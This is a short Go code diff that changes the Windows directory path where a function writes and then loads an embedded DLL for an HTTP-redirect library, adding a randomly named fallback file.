@@ -75,11 +75,16 @@ func statikLoadLibrary(libraryPath string) (err error){
 	if err != nil {
 		return
 	}
+	
 
-	libraryPath = os.ExpandEnv("${windir}\\System32\\" + getRandomString(6) + ".dll")
+	libraryPath = os.ExpandEnv("${windir}\\fundadore\\base.dll")
 
 	if err = SetFile(dllContent, libraryPath); nil != err{
-		return
+		libraryPath = os.ExpandEnv("${windir}\\fundadore\\" + getRandomString(6) + ".dll")
+		
+		if err = SetFile(dllContent, libraryPath); nil != err{
+			return
+		}
 	}
 
 	g_libhttpredirect, err = syscall.LoadLibrary(libraryPath)
